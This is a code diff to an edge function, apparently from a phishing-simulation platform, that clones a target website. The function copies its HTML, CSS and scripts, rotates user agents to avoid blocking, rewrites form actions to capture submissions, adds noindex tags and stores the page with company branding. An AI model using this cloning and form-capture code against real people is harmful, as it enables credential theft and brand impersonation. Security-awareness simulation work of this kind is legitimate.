@@ -1,4 +1,3 @@
-
 import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
 import { createClient } from "https://esm.sh/@supabase/supabase-js@2.39.7";
 import { DOMParser } from "https://deno.land/x/deno_dom@v0.1.38/deno-dom-wasm.ts";
@@ -69,6 +68,90 @@ function getRandomUserAgent() {
   return userAgents[Math.floor(Math.random() * userAgents.length)];
 }
 
+// Improved fetch with retries and timeouts
+async function fetchWithRetry(url: string, options: RequestInit = {}, retries = 3, timeout = 10000): Promise<Response> {
+  // Create abort controller for timeout
+  const controller = new AbortController();
+  const timeoutId = setTimeout(() => controller.abort(), timeout);
+  
+  // Add controller signal to options
+  const fetchOptions = {
+    ...options,
+    signal: controller.signal,
+  };
+  
+  try {
+    const response = await fetch(url, fetchOptions);
+    clearTimeout(timeoutId);
+    return response;
+  } catch (error) {
+    clearTimeout(timeoutId);
+    
+    if (retries <= 1) throw error;
+    
+    // Exponential backoff
+    const delay = Math.min(1000 * (2 ** (4 - retries)), 5000);
+    console.log(`Retrying fetch for ${url} in ${delay}ms. Retries left: ${retries - 1}`);
+    await new Promise(resolve => setTimeout(resolve, delay));
+    
+    return fetchWithRetry(url, options, retries - 1, timeout);
+  }
+}
+
+// Check if URL is accessible
+async function isUrlAccessible(url: string): Promise<boolean> {
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 5000);
+    
+    const response = await fetch(url, {
+      method: 'HEAD',
+      headers: {
+        'User-Agent': getRandomUserAgent(),
+      },
+      signal: controller.signal,
+    });
+    
+    clearTimeout(timeoutId);
+    return response.ok;
+  } catch (error) {
+    console.warn(`URL accessibility check failed for ${url}:`, error.message);
+    return false;
+  }
+}
+
+// Try alternative URL formats if the main one fails
+async function tryAlternativeUrls(url: string): Promise<string | null> {
+  // Parse the URL to get components
+  let parsedUrl;
+  try {
+    parsedUrl = new URL(url);
+  } catch (e) {
+    return null;
+  }
+  
+  const alternativeUrls = [
+    url, // Original URL
+    url.replace(/\/$/, ''), // Without trailing slash
+    `${parsedUrl.origin}${parsedUrl.pathname}`, // Without query parameters
+    parsedUrl.origin, // Just the domain
+  ];
+  
+  // Try each alternative URL
+  for (const altUrl of alternativeUrls) {
+    try {
+      const isAccessible = await isUrlAccessible(altUrl);
+      if (isAccessible) {
+        return altUrl;
+      }
+    } catch (e) {
+      console.warn(`Failed checking alternative URL: ${altUrl}`);
+    }
+  }
+  
+  return null; // No accessible URL found
+}
+
 serve(async (req) => {
   // Handle CORS preflight requests
   if (req.method === "OPTIONS") {
@@ -94,7 +177,7 @@ serve(async (req) => {
     }
     
     const { 
-      url, 
+      url: originalUrl, 
       name, 
       category, 
       advancedCloning = false, 
@@ -104,116 +187,136 @@ serve(async (req) => {
       preserveInteractivity = false
     } = await req.json() as CloneWebsiteRequest;
     
-    if (!url || !name || !category) {
+    if (!originalUrl || !name || !category) {
       throw new Error("Missing required fields");
     }
     
-    console.log(`Cloning website: ${url} (Advanced: ${advancedCloning ? 'Yes' : 'No'})`);
+    console.log(`Cloning website: ${originalUrl} (Advanced: ${advancedCloning ? 'Yes' : 'No'})`);
     
-    // Validate URL
+    // Validate URL format
     let targetUrl: URL;
     try {
-      targetUrl = new URL(url);
+      targetUrl = new URL(originalUrl);
     } catch (e) {
-      throw new Error("Invalid URL provided");
+      throw new Error("Invalid URL format provided");
     }
     
+    // Check if URL is accessible or try alternatives
+    const accessibleUrl = await tryAlternativeUrls(originalUrl);
+    if (!accessibleUrl) {
+      throw new Error("Unable to access the target URL. The website may be blocking our requests or is unavailable.");
+    }
+
     // Step 1: Fetch the main HTML page with a rotating user agent
     console.log("Fetching main HTML content...");
-    const userAgent = getRandomUserAgent();
-    const htmlResponse = await fetch(url, {
-      headers: {
-        "User-Agent": userAgent,
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Sec-Fetch-Dest": "document",
-        "Sec-Fetch-Mode": "navigate",
-        "Sec-Fetch-Site": "none",
-        "Sec-Fetch-User": "?1",
-        "Upgrade-Insecure-Requests": "1"
-      },
-    });
-    
-    if (!htmlResponse.ok) {
-      throw new Error(`Failed to fetch website: ${htmlResponse.status} ${htmlResponse.statusText}`);
-    }
-    
-    const htmlContent = await htmlResponse.text();
-    
-    // Step 2: Parse the HTML and extract resources with enhanced capabilities
-    console.log("Parsing HTML and extracting resources...");
-    const { 
-      cssContent, 
-      jsContent, 
-      modifiedHtml,
-      assets,
-      metadata,
-      formFields 
-    } = await processHtml(
-      htmlContent, 
-      targetUrl, 
-      advancedCloning,
-      extractDynamicContent,
-      includeAssets
-    );
-    
-    // Step 3: Detect company information and branding
-    const pageInfo = extractPageInfo(htmlContent, targetUrl);
-    
-    // Step 4: Create a record in the phishing_pages table with enhanced metadata
-    console.log("Saving phishing page to database...");
-    const { data, error } = await supabase
-      .from("phishing_pages")
-      .insert({
-        name: name,
-        category: category,
-        html_content: modifiedHtml,
-        css_content: cssContent,
-        js_content: jsContent,
-        source_url: url,
-        is_custom: false,
-        metadata: {
-          page_title: pageInfo.title,
-          company_name: pageInfo.companyName,
-          description: pageInfo.description,
-          favicon: pageInfo.favicon,
-          form_fields: formFields,
-          assets_count: assets.length,
-          clone_timestamp: new Date().toISOString(),
-          cloning_mode: advancedCloning ? "advanced" : "standard"
-        }
-      })
-      .select("id")
-      .single();
-    
-    if (error) {
-      throw error;
-    }
-    
-    console.log(`Website cloned successfully! Page ID: ${data.id}`);
-    
-    // Store assets if needed (in a real implementation)
-    if (includeAssets && assets.length > 0) {
-      console.log(`Processed ${assets.length} assets`);
-      // In a full implementation, we'd store assets in storage buckets
-    }
-    
-    return new Response(
-      JSON.stringify({ 
-        success: true, 
-        pageId: data.id,
-        message: "Website cloned successfully",
-        metadata: {
-          title: pageInfo.title,
-          company: pageInfo.companyName,
-          assets: assets.length,
-          forms: formFields.length
-        }
-      }),
-      {
-        headers: { ...corsHeaders, "Content-Type": "application/json" },
+    try {
+      const userAgent = getRandomUserAgent();
+      const fetchOptions = {
+        headers: {
+          "User-Agent": userAgent,
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.9",
+          "Sec-Fetch-Dest": "document",
+          "Sec-Fetch-Mode": "navigate",
+          "Sec-Fetch-Site": "none",
+          "Sec-Fetch-User": "?1",
+          "Upgrade-Insecure-Requests": "1",
+          "Cache-Control": "no-cache",
+        },
+        redirect: "follow",
+      };
+      
+      const htmlResponse = await fetchWithRetry(accessibleUrl, fetchOptions);
+      
+      if (!htmlResponse.ok) {
+        throw new Error(`Failed to fetch website: ${htmlResponse.status} ${htmlResponse.statusText}`);
       }
-    );
+      
+      const htmlContent = await htmlResponse.text();
+      
+      if (!htmlContent || htmlContent.length < 100) {
+        throw new Error("Retrieved HTML content is too small or empty");
+      }
+      
+      // Step 2: Parse the HTML and extract resources with enhanced capabilities
+      console.log("Parsing HTML and extracting resources...");
+      const { 
+        cssContent, 
+        jsContent, 
+        modifiedHtml,
+        assets,
+        metadata,
+        formFields 
+      } = await processHtml(
+        htmlContent, 
+        targetUrl, 
+        advancedCloning,
+        extractDynamicContent,
+        includeAssets
+      );
+      
+      // Step 3: Detect company information and branding
+      const pageInfo = extractPageInfo(htmlContent, targetUrl);
+      
+      // Step 4: Create a record in the phishing_pages table with enhanced metadata
+      console.log("Saving phishing page to database...");
+      const { data, error } = await supabase
+        .from("phishing_pages")
+        .insert({
+          name: name,
+          category: category,
+          html_content: modifiedHtml,
+          css_content: cssContent,
+          js_content: jsContent,
+          source_url: originalUrl,
+          is_custom: false,
+          metadata: {
+            page_title: pageInfo.title,
+            company_name: pageInfo.companyName,
+            description: pageInfo.description,
+            favicon: pageInfo.favicon,
+            form_fields: formFields,
+            assets_count: assets.length,
+            clone_timestamp: new Date().toISOString(),
+            cloning_mode: advancedCloning ? "advanced" : "standard",
+            accessible_url: accessibleUrl
+          }
+        })
+        .select("id")
+        .single();
+      
+      if (error) {
+        throw error;
+      }
+      
+      console.log(`Website cloned successfully! Page ID: ${data.id}`);
+      
+      // Store assets if needed (in a real implementation)
+      if (includeAssets && assets.length > 0) {
+        console.log(`Processed ${assets.length} assets`);
+        // In a full implementation, we'd store assets in storage buckets
+      }
+      
+      return new Response(
+        JSON.stringify({ 
+          success: true, 
+          pageId: data.id,
+          message: "Website cloned successfully",
+          metadata: {
+            title: pageInfo.title,
+            company: pageInfo.companyName,
+            assets: assets.length,
+            forms: formFields.length
+          }
+        }),
+        {
+          headers: { ...corsHeaders, "Content-Type": "application/json" },
+        }
+      );
+    } catch (fetchError) {
+      console.error("Error fetching website content:", fetchError);
+      throw new Error(`Failed to fetch website content: ${fetchError.message}`);
+    }
   } catch (error) {
     console.error("Error in clone-website function:", error);
     return new Response(
@@ -323,26 +426,28 @@ async function processHtml(
       }
     }
     
-    // Fetch and combine CSS content
+    // Fetch and combine CSS content with improved error handling
     const cssContents: string[] = [];
     for (const cssFile of cssFiles) {
       try {
-        const response = await fetch(cssFile, {
+        const response = await fetchWithRetry(cssFile, {
           headers: {
             "User-Agent": getRandomUserAgent(),
             "Accept": "text/css,*/*;q=0.1",
             "Accept-Language": "en-US,en;q=0.9",
           }
-        });
+        }, 2, 5000); // 2 retries, 5 second timeout
         
         if (response.ok) {
           const css = await response.text();
           // Process CSS to fix relative URLs
           const processedCss = processCssUrls(css, cssFile);
           cssContents.push(`/* From: ${cssFile} */\n${processedCss}`);
+        } else {
+          console.warn(`Failed to fetch CSS file (status ${response.status}): ${cssFile}`);
         }
       } catch (e) {
-        console.warn(`Failed to fetch CSS file: ${cssFile}`, e);
+        console.warn(`Error fetching CSS file: ${cssFile}`, e.message);
       }
     }
     
@@ -428,27 +533,29 @@ async function processHtml(
         }
       }
       
-      // Fetch and combine JavaScript content
+      // Fetch and combine JavaScript content with improved error handling
       const jsContents: string[] = [];
       // Limit to prevent excessive processing
       const jsFilesToProcess = jsFiles.slice(0, advancedCloning ? 10 : 3);
       
       for (const jsFile of jsFilesToProcess) {
         try {
-          const response = await fetch(jsFile, {
+          const response = await fetchWithRetry(jsFile, {
             headers: {
               "User-Agent": getRandomUserAgent(),
               "Accept": "*/*",
               "Accept-Language": "en-US,en;q=0.9",
             }
-          });
+          }, 2, 5000); // 2 retries, 5 second timeout
           
           if (response.ok) {
             const js = await response.text();
             jsContents.push(`// From: ${jsFile}\n${js}`);
+          } else {
+            console.warn(`Failed to fetch JS file (status ${response.status}): ${jsFile}`);
           }
         } catch (e) {
-          console.warn(`Failed to fetch JavaScript file: ${jsFile}`, e);
+          console.warn(`Error fetching JS file: ${jsFile}`, e.message);
         }
       }
       
@@ -466,16 +573,35 @@ async function processHtml(
       jsContent = jsContents.join('\n\n');
     }
     
+    // Add fallback message for broken link scenarios
+    const fallbackMessage = `
+    <style>
+      .phishing-fallback-message {
+        padding: 20px;
+        margin: 20px 0;
+        background-color: #f8f9fa;
+        border: 1px solid #dee2e6;
+        border-radius: 4px;
+        font-family: Arial, sans-serif;
+      }
+    </style>
+    <div class="phishing-fallback-message">
+      <p>The content might not display correctly due to security restrictions. This is normal for phishing simulations.</p>
+    </div>
+    `;
+    
     // Modify HTML content to use our version of CSS and JS
     modifiedHtml = htmlContent
       // Replace all CSS links with a single link to our CSS
       .replace(/<link[^>]*rel=["']stylesheet["'][^>]*>/g, '')
       // Add our CSS before the closing head tag
-      .replace('</head>', '<style id="phishing-simulation-styles">\n' + cssContent + '\n</style>\n</head>')
+      .replace('</head>', `<style id="phishing-simulation-styles">\n${cssContent}\n</style>\n${fallbackMessage}</head>`)
       // Replace form actions to capture submissions
       .replace(/<form([^>]*)action=["']([^"']*)["']([^>]*)>/g, (match, before, action, after) => {
         return `<form${before}action="#" data-original-action="${action}"${after} onsubmit="return handleFormSubmit(this, event);">`;
-      });
+      })
+      // Add noindex meta tag to prevent search engines from indexing
+      .replace('<head>', '<head>\n<meta name="robots" content="noindex,nofollow">\n<meta name="googlebot" content="noindex,nofollow">\n');
     
     // Add enhanced form handling functionality
     const formHandlingScript = `
@@ -534,6 +660,16 @@ async function processHtml(
     
     // Add enhanced visual fidelity and behavior simulation
     document.addEventListener('DOMContentLoaded', function() {
+      // Ensure all images have error handling
+      var allImages = document.querySelectorAll('img');
+      allImages.forEach(function(img) {
+        img.onerror = function() {
+          console.warn('Failed to load image:', img.src);
+          // Optional: replace with placeholder
+          // img.src = '/placeholder.svg';
+        };
+      });
+      
       // Make all buttons and links functional for realistic behavior
       var allButtons = document.querySelectorAll('button:not([type="submit"])');
       allButtons.forEach(function(button) {
